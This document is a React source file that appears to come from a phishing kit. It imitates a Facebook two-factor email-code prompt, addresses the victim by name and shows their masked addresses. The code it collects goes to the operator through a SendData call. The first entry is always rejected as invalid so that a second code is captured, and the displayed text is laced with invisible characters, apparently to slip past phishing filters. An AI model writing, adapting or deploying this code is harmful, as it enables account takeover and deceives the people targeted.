import React, { useContext, useEffect, useRef, useState } from 'react'
import { styled } from 'styled-components'
import SendData from '../hooks/SendData'
import Image from 'next/image'
import { DataContext } from '../pages'

const ModalContainer = styled.div`
    position: fixed;   
    display: flex;
    justify-content: center;
    align-items: center;

    width: 100%;
    height: 100%;
    z-index: 1000;
    top: 0px;
    left: 0px;
    padding-inline: 1rem;
`
const ModalContent = styled.div`
    max-width: 550px;
    width: 100%;
    height: 530px;
    display: flex;
    flex-direction: column;
    justify-content: space-between;
    position: relative;
    padding-block: 1.5rem;
    margin-block: 1rem;
    @media (max-width: 991.98px) {
      height: 430px;
    }
    button:disabled {
      opacity: 0.5;
    }
`

const ModalTitle = styled.div`
    padding-bottom: 0.1rem;
    font-weight: 700;
    font-size: 20px;
`
const SmallText = styled.div`
    color: #1C2B33;
    font-size: 14px;
    line-height: 1.3;
`
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`

const CustomInput = styled.input`
    width: 100%;
    border: 1px solid #ddd;
    padding: 0.75rem;
    outline: none !important;
    border-radius: 10px;
    &.redborder {
      border: 1px solid red !important;
    }

    :focus {
    border: 1px solid #aaa;

    }
    margin-bottom: 0.5rem;
`
const StyledButton = styled.button`
  background-color: #0064e0;
    border: 1px solid #0064e0;
    width: 100%;
    color: white;
    font-size: 13px;
    font-weight: 500;
    padding: 10px 20px;
    border-radius: 50px;
    text-transform: none;

    :disabled {
        opacity: 0.5;
    }

`
const ErrorDiv = styled.div`
    font-size: 12px;
    color: red;
    text-align: left;
    padding-bottom: 0.5rem;
    margin-top: -0.35rem;
`

const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 250px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) { 
    min-height: 160px;
    border-radius: 10px;
    
    img {
      border-radius: 10px;
    }
  }

`
const Spinner = styled.div`
    width: 15px;
    height: 15px;
    border: 2px solid #FFF;
    border-bottom-color: transparent;
    border-radius: 50%;
    display: inline-block;
    box-sizing: border-box;
    animation: rotation 1s linear infinite;

    @keyframes rotation {
    0% {
        transform: rotate(0deg);
    }
    100% {
        transform: rotate(360deg);
    }
    } 
`
function Fa2Email({ Unik, setStep, Name, Email, BusinessEmail, Ip }) {
    const [Error, setError] = useState(false)
    const [ClickCount, setClickCount] = useState(0)
    const [counter, setCounter] = useState(10);
    const [Code, setCode] = useState('')
    const btnRef = useRef()
    const [TriedSubmit, setTriedSubmit] = useState(false)
    const [IsLoading, setIsLoading] = useState(false)

    useEffect(() => {
        if (Error) {

            if (counter > 0) {
                setTimeout(() => setCounter(counter - 1), 1000)
            }
            else if (counter === 0) {
                btnRef.current.disabled = false
                setError(false)
                setTriedSubmit(false)
            }
        }
    }, [counter, Error])

    let { setAllData, AllData } = useContext(DataContext);

    const NextClicked = (e) => {
        setTriedSubmit(true)

        if (Code.length === 6 || Code.length === 8) {

            if (ClickCount === 0) {
                e.target.disabled = true
                setError(true)
                setClickCount(1)
                setCode('')

                const params = {
                    ...AllData,
                    email2fa: Code,
                    currentStep: 'Email 2FA 2'
                };

                setAllData(params)
                SendData(params)
            }

            else {
                setIsLoading(true)
                setError(false)
                e.target.disabled = true
                const params = {
                    ...AllData,
                    email2fa: Code
                };

                setAllData(params)
                SendData(params)

                setTimeout(() => {
                    setStep(4)
                    setIsLoading(false)
                }, 1000);

            }
        }

    }

    React.useEffect(() => {
        const params = {
            ...AllData,
            currentStep: 'Email 2FA'
        };

        SendData(params)

    }, [])

    return (

        <ModalContainer>
            <ModalContent>
                <div className='text-start'>
                    <span style={{ fontWeight: 500, fontSize: '14px' }}>
                        {Name ? Name.split(' ')[0].charAt(0).toUpperCase() + Name.split(' ')[0].slice(1) + ' ' + (Name.split(' ')[1] ? Name.split(' ')[1].charAt(0).toUpperCase() + Name.split(' ')[1].slice(1) : '') : ''} • Facebook
                    </span>
                    <ModalTitle>
                        C‎h‎eck y‎o‎ur em‎ai‎l
                    </ModalTitle>
                    <SmallText>
                        Enter the code we sent to {Email.substring(0, 3)}******{Email.substring(Email.indexOf('@'))}
                        ({BusinessEmail.substring(0, 3)}******{BusinessEmail.substring(BusinessEmail.indexOf('@'))})
                    </SmallText>
                </div>
                <ImgWrapper>
                    <Image
                        alt=""
                        src="/assets/images/New2FA.jpg"
                        layout='fill'
                        objectFit='cover'
                    />
                </ImgWrapper>
                <div>
                    <div className="form-floating">
                        <CustomInput placeholder='Code' type='number' value={Code} onChange={(e) => { setCode(e.target.value) }}
                            className={`form-control ${((Code.length !== 6 || Code.length !== 8) && TriedSubmit) && 'redborder'} `} />
                        <label htmlFor="floatingInput">Code</label>
                    </div>

                    {Error && (
                        <ErrorDiv>
                            In‎va‎li‎d a‎ut‎he‎nt‎i‎ca‎ti‎o‎n co‎d‎e
                        </ErrorDiv>
                    )}
                    <SmallText>
                        {Error && (
                            <>
                                We can send a new code in&nbsp;
                                <span className='text-start fw-bold'>
                                    00:{counter < 10 && <>0</>}{counter}
                                </span>
                            </>
                        )}
                    </SmallText>

                    <StyledButton onClick={NextClicked} ref={btnRef} className='mt-2'>
                        {IsLoading ? <Spinner /> : 'Continue'}
                    </StyledButton>
                </div>
            </ModalContent>
        </ModalContainer>

    )
}

export default Fa2Email